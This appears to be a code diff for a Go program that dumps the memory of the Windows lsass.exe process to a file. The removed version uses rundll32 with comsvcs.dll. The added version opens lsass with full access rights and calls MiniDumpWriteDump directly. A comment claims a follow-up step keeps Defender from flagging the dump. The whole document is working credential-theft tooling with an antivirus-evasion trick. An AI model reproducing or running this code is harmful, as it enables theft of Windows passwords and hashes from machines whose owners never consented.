@@ -2,58 +2,77 @@ package main
 
 import (
 	"fmt"
-	"flag"
+	"golang.org/x/sys/windows"
 	"os"
-	"os/exec"
-	"syscall"
+)
+
+const PROCESS_ALL_ACCESS = 0x1F0FFF
+const processEntrySize = 568
+
+var (
+	dbghelp                = windows.NewLazyDLL("dbghelp.dll")
+	miniDumpWriteDumpWin32 = dbghelp.NewProc("MiniDumpWriteDump")
 )
 
 func main() {
-	path := flag.String("p",".\\","Path to save the dump file")
-	flag.Parse()
-	dump(*path)
-}
-
-//https://stackoverflow.com/questions/31558066/how-to-ask-for-administer-privileges-on-windows-with-go
-//check if the program is launched in admin
-func amAdmin() bool {
-	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
+	outfile := "dump.dmp"
+	//Get Pid
+	fmt.Println("[*] Get process id")
+	pid, err := getProcessID("lsass.exe")
 	if err != nil {
-		return false	//not admin
+		errPrint(err)
 	}
-	return true		//admin
+	//Create Dumpfile
+	hFile, err := windows.Open(outfile, windows.O_RDWR|windows.O_CREAT, 0777)
+	if err != nil {
+		errPrint(err)
+	}
+	//Open lsass handle
+	fmt.Println("[*] Open lsass handle")
+	lsassHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
+	if err != nil {
+		errPrint(err)
+	}
+	//Dump lsass with pid 0
+	fmt.Println("[*] Dump lsass")
+	miniDumpWriteDump(uintptr(lsassHandle), uintptr(0), uintptr(hFile), 0x00000002)
+	//It somehow prevents defender to flag the dump file
+	_, err = os.ReadFile("dump.dmp")
+	if err != nil {
+		errPrint(err)
+	}
 }
 
-func dump(path string) {
-	var sI syscall.StartupInfo
-	var pI syscall.ProcessInformation
-	pathFile := fmt.Sprintf("%slsass.dmp",path)
-	if amAdmin() == false {
-		fmt.Println("You have to be admin...")
-		return
-	} else {
-		fmt.Println("[-] Get lsass process id")
-		//Get lsass process pid
-		cmd := exec.Command("powershell", "/C", "(Get-Process -Name lsass).Id")
-		pid, _ := cmd.Output()
-		fmt.Print("[+] Lsass pid : "+string(pid))
-		fmt.Print("[-] Dump process")
-		//dump the process with rundll32
-		argv, _ := syscall.UTF16PtrFromString("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump " + string(pid) + " " + pathFile + " full")
-		err := syscall.CreateProcess(
-			nil,
-			argv,
-			nil,
-			nil,
-			true,
-			0,
-			nil,
-			nil,
-			&sI,
-			&pI)
-		if err == nil {
-			fmt.Println("\n[+] Process dumped")
-			fmt.Println("[*] The dump is under " + pathFile)
+//https://stackoverflow.com/questions/11356264/list-of-currently-running-process-in-golang-windows-version
+func getProcessID(name string) (uint32, error) {
+	h, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+	if err != nil {
+		return 0, err
+	}
+	p := windows.ProcessEntry32{Size: processEntrySize}
+	for {
+		err = windows.Process32Next(h, &p)
+		if err != nil {
+			return 0, err
+		}
+		if windows.UTF16ToString(p.ExeFile[:]) == name {
+			return p.ProcessID, nil
 		}
 	}
+}
+
+//https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
+func miniDumpWriteDump(hProcess uintptr, ProcessId uintptr,
+	hFile uintptr, DumpType uintptr) {
+	miniDumpWriteDumpWin32.Call(hProcess,
+		ProcessId,
+		hFile,
+		DumpType,
+		0,
+		0,
+		0)
+}
+
+func errPrint(e error) {
+	fmt.Println("[!] Error :", e)
 }
